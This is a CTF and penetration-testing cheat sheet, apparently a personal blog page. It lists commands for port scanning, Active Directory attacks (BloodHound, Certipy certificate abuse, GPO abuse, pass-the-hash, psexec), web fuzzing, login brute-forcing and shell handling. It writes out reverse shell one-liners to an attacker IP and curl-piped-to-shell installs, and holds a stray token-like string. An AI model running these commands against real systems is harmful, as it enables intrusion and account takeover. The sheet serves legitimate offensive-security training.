---
title: CTF Cheat Sheet
---

**Tagline:** *Everyday Hacks to Elite Attacks — Cyber Warfare. Ghost Ops. Red Team Tactics. HaxrByte.*

# {% include alchemy-fire.html %} CTF CheatSheet

### UPDATE DATE: 16 Apr 2026
{:toc}

# {% include alchemy-fire.html %} PortScan

```bash
sudo rustscan -a <hostname> -- -sCV -oA <filename>

sudo nmap <hostname> -sT -Pn -n -sCV -p- -T4 --min-rate 5000 --max-retries 2 -vv -oA <filename>
```

# {% include alchemy-fire.html %} BloodHound

```bash
sudo systemctl start docker
sudo systemctl enable docker
sudo systemctl status docker

(remove)
sudo docker compose down -v --rmi all

(install)
sudo curl -L https://ghst.ly/getbhce | sudo docker compose -f - up
wget https://ghst.ly/getbhce -O docker-compose.yml
* sudo docker compose up

sudo ./bloodhound containers start

bUdI0thxdF7MV1WnCRF_sXtRSjQzL1Y7
```

## RustHound

```bash
rusthound-ce --domain <domain_name> -u <username> -p <password>
rusthound-ce --domain <domain_name> -k -no-pass
```

---

# {% include alchemy-fire.html %} SMB (AD)

## smbclient

```bash
smbclient -L //<target> -U <username>%<password>

smbclient //<target>/<share> -U <username>%<password>
```

## impacket-smbclient

```bash
impacket-smbclient <domainname>/<username>:<password>@<hostname>
```

## NetEXEC (nxc)

```bash
nxc -L (list modules)

ncx -M <module_name> --options (module options)

nxc smb <target> -u <user> -p <password> --generate-hosts-file <hosts_file>

nxc ldap <target> -u <user> -p <password> -M pre2k

Run with UV:

uv run nxc smb <target> -u <user> -p <password>
```

## BloodyAD

```bash
bloodyAD --host <ip_address> -u <user> -p <password> -d <domain> add groupMember 'group_name_to_add' user_to_add
bloodyAD --host <ip_address> -u <user> -p <password> -d <domain> set password 'name_password_change' 'new_password'
bloodyAD --host <ip_address> -u <user> -p <password> -d <domain> remove uac -f ACCOUNTDISABLE 'name_disabled' 

# Add Machine Account
bloodyAD --host <ip_address> -u <user> -p <password> -d <domain> add computer <name> <password>
impacket-addcomputer -computer-name <name> -computer-pass <password> domain/user:'password' -dc-ip <ip_address>
```

## Certipy

```bash
certipy-ad

certipy find -username <username> -hashes <:ntlm_hash> -dc-ip <ip_address> -vulnerable -stdout

# Request cert and update the UPN of Administrator
certipy req -u <username> -hashes <:ntlm_hash> -ca <ca_name> -template <ca_template> -upn <administrator> -dc-ip <ip_address> -sid <sid>

certipy account -u <username> -p <password> -dc-ip <ip_address> -user <ca_svc> -upn <username> update

# User certificate to request the NT Hash
certipy auth -dc-ip <ip_address> -pfx administrator.pfx -username administrator -domain <domain_name>
```

## Evil-winrm

```bash
evil-winrm -i <ip_address> -u <username> -H <ntlm_hash>
```

## Kerbrute

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build

GOOS=linux GOARCH=arm64 go build -o kerbrute

./kerbrute userenum --domain <domain> --dc <dc_name> <username_file>
```

## Username-Anarchy

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git

./username-anarchy -i <username_file>
```

## Generate-AD-Username

```bash
git clone https://github.com/w0Tx/generate-ad-username.git

python3 generate-ad-username/ADGenerator.py names.csv
```

## GPO Abuse

```bash
└─$python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators greg.shields /add'
[+] ScheduledTask TASK_11049927 created!
```

---

# {% include alchemy-fire.html %} Kerberos Auth

```bash

nxc smb <target> -k --use-kcache --generate-krb5-file <krb_configfile>

---

nxc smb ip -u server$ -p server -k

nxc smb ip -u server$ -p server -k --generate-tgt ticket

export KRB5CCNAME=<user.ccache>
nxc smb <target> -k --use-kcache

---

Linux Kerberos File:
/etc/krb5.conf

[libdefaults]
				default_realm = REALM_NAME.vl

[realms]
				REALM_NAME.vl = {
				            kdc = dc.domain.vl
				            admin_server = dc.domain.vl
				}

NOTE: sduo apt install krb5-user

Update Password:
kpassword SERVER$
Password for SERVER$@domain.vl:
Enter new password:

```

---

# {% include alchemy-fire.html %} Remote Access

```bash
impacket-psexec <domain_name>/<username>:'<password>'@<target>
```

---

# {% include alchemy-fire.html %} Web Enumeration

## Files or Directories

```bash
dirsearch -u http://<target>

gobuster dir -u http://<target> -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html

dirb http://<target>

ffuf (golang)
ffuf -u "http://<target>/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.aspx,.html,.txt
-e = comma seperated list of extentions (extends FUZZ keyword)
-recurtion = recurtion on (default: false)
-mc = display HTTP status codes (default: ALL)

feroxbuster (rust)
feroxbuster -u https://<target>
-f = append '/' to each URL
-n = no recursion
```

## SubDomains (vHost)

```bash
gobuster vhost -u http://<target> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

ffuf -u http://<target> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000 -ic -c -fs <size>
-ic = ignore wordlist comments (default: false)
-c = color output (default: false)
```

## Brute Force Login Form

```bash
ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
```

---

# {% include alchemy-fire.html %} Vulnerability Scanner

```bash
(remote scan)
nuclei -u <target>
-up = update nuclei
-ut = update templates

(local scan)
nuclei -u <folder_name> -file
```

---

# {% include alchemy-fire.html %} SHELLS

## Listener

```bash
nc -lvnp <8080:port>

- Readline Wrapper
rlwrap nc -lvnp <8080:port>

penelope -i tun0 -p 1339
```

## Reverse Shell

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
"bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<8080:port> 0>&1'"

nc -e /bin/sh <attacker_ip> <8080:port>

busybox nc <attacker_ip> 9090 -e /bin/sh
```

## Full/Stable TTYs

```python
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg

* export TERM=screen

** You may also need to set the correct terminal size
stty rows <your_rows_value> cols <your_cols_value>
stty size

** Note: When you are finished with the stable shell and exit it, your local terminal's echo settings will still be off. You must type `reset` in your local terminal to return it to normal functionality. 
```

---

# {% include alchemy-fire.html %} Python

## Python Virtual Environment

```bash
python3 -m venv venv
source venv/bin/activate
pip3 install .

OR

pip3 install -r requirements.txt

---

## Python2
sudo apt install python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python2 get-pip.py

sudo python2 -m pip install "virtualenv<20"

python2 -m virtualenv my_python2
source my_python2_env/bin/activate
# Now you're in a Python 2 environment
python your_script.py
```

## PIPX

```bash
pipx list

pipx uninstall <app_name>
```

## UV (pipx replacement)

```bash
* NOTE: uv - An extremely fast Python package and project manager, written in Rust.
A single tool to replace pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv, and more.
- https://github.com/astral-sh/uv
- https://0xdf.gitlab.io/cheatsheets/uv#scripts
- Python UV for Hackers - https://youtu.be/G36QXtBXKBQ?si=TKTQd7lRfZIGwy8n

* INSTALL UV:
# On macOS and Linux.
curl -LsSf https://astral.sh/uv/install.sh | sh

* UPDATE:
uv self update

* INSTALL TOOL:
uv tool install <app_name>

* PYTHON VERSIONS
uv python list
uv tool install --python 3.12 <app_name>
uv python uninstall 3.12

* WORKFLOW:
$ git clone https://github.com/test/app
$ cd app
$ uv add --script app.py -r requirements.txt 
$ uv run app.py

* RUN LIKE BINARY:
$ head app.py 
#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "impacket",
#     "ldap3",
# ]
```

## Web Server

```bash
python3 -m http.server <8080:port> -d <directory>
```

# {% include alchemy-fire.html %} Walkthroughs

```html
https://0xdf.gitlab.io/
```

---

# {% include alchemy-fire.html %} Resources

```html

# Hacking Articles
https://www.hackingarticles.in/

# HackTricks
https://hacktricks.wiki/en/index.html

# GTFObins
https://gtfobins.github.io/

# Windows Exploit Suggester - Next Generation
https://github.com/bitsadmin/wesng

# Reverse Shells
https://www.revshells.com/

# Penelope
https://github.com/brightio/penelope

# Pre-Created Computer Accounts
https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
```

---
